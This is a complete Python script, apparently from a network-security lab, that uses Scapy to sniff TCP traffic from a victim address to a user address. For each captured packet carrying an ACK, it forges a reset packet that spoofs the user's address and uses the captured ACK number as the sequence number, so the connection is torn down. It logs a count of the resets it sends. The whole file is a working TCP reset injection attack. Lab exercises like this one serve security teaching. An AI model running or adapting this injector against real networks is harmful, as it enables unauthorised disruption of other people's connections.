#!/usr/bin/env python3
"""Inject TCP reset packets into victim-to-user connections in the lab."""

from scapy.all import IP, TCP, send, sniff


VICTIM_IP = "192.168.4.105"
USER_IP = "192.168.3.100"
ATTACKER_INTERFACE = "eth0"
CAPTURE_FILTER = (
    f"tcp and src host {VICTIM_IP} and dst host {USER_IP}"
)

reset_count = 0


def packet_callback(packet):
    """Send a forged client-side RST for each captured ACK-bearing packet."""
    global reset_count

    if not packet.haslayer(IP) or not packet.haslayer(TCP):
        return

    tcp_layer = packet[TCP]

    # The ACK number from the server packet is the expected client sequence.
    if not (int(tcp_layer.flags) & 0x10):
        return

    reset_packet = (
        IP(src=USER_IP, dst=VICTIM_IP)
        / TCP(
            sport=int(tcp_layer.dport),
            dport=int(tcp_layer.sport),
            flags="R",
            seq=int(tcp_layer.ack),
        )
    )

    send(reset_packet, iface=ATTACKER_INTERFACE, verbose=False)
    reset_count += 1

    if reset_count <= 10 or reset_count % 50 == 0:
        print(
            f"[+] Sent RST #{reset_count}: "
            f"{USER_IP}:{tcp_layer.dport} -> "
            f"{VICTIM_IP}:{tcp_layer.sport}, seq={tcp_layer.ack}",
            flush=True,
        )


def main():
    print("[*] TCP RST injection listener started.", flush=True)
    print(
        f"[*] Listening on {ATTACKER_INTERFACE} with filter: {CAPTURE_FILTER}",
        flush=True,
    )
    print(
        "[*] Start a TCP connection from the user container. Press Ctrl+C to stop.",
        flush=True,
    )

    try:
        sniff(
            iface=ATTACKER_INTERFACE,
            filter=CAPTURE_FILTER,
            prn=packet_callback,
            store=False,
        )
    except KeyboardInterrupt:
        print(
            f"\n[*] Listener stopped. Total RST packets sent: {reset_count}",
            flush=True,
        )


if __name__ == "__main__":
    main()
